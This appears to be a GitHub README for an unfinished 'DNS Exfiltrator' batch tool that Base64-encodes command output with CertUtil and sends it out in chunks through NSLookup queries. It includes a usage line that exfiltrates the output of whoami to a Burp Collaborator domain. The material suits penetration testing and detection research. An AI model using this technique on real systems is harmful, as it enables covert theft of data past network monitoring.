# DNS Exfiltrator

Exfiltrate data with DNS queries. Based on CertUtil and NSLookup.

Command output will be encoded in Base64 encoding with CertUtil and exfiltrated in chunks up to 63 characters per query with NSLookup.

Batch script for exfiltrating the command output was tested on Windows 10 Enterprise OS (64-bit).

Made for educational purposes. I hope it will help!

**TO DO: Make the whole Batch script as an one-liner.**

**TO DO: Finish the project.**

## How to Run

**TO DO: Make this section more clear.**

Open the Command Prompt from [\\src\\](https://github.com/ivan-sincek/dns-exfiltrator/tree/main/src) and run the following command:

```fundamental
dns_exfiltrator.bat d2hvYW1p xyz.burpcollaborator.net
```

Your command must be a Batch one-liner encoded in Base64 encoding, e.g. `d2hvYW1p` - which is equal to `whoami`.

**TO DO: Not all DNS queries are pulled from Burp Collaborator and duplicates may occur. Have to find a solution, maybe make my own Burp Suite extension.**

## Images

<p align="center"><img src="https://github.com/ivan-sincek/dns-exfiltrator/blob/main/img/dns_exfiltration.jpg" alt="DNS Exfiltration"></p>

<p align="center">Figure 1 - DNS Exfiltration</p>
